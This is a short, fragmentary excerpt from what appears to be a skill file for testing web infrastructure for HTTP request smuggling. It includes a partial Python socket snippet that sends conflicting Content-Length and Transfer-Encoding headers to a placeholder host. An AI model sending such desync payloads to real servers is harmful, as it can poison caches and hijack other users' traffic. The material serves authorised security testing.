...
description: Use when testing proxies, load balancers, caches, or web servers for HTTP desynchronization, CL.TE, TE.CL, TE.TE, HTTP/2 smuggling, or poisoning paths.
---
...
')
time.sleep(2)
s.send(b'Host: vulnerable.com\r
')
time.sleep(2)
s.send(b'Content-Length: 50\r
')
s.send(b'Transfer-Encoding: chunked\r
\r
')
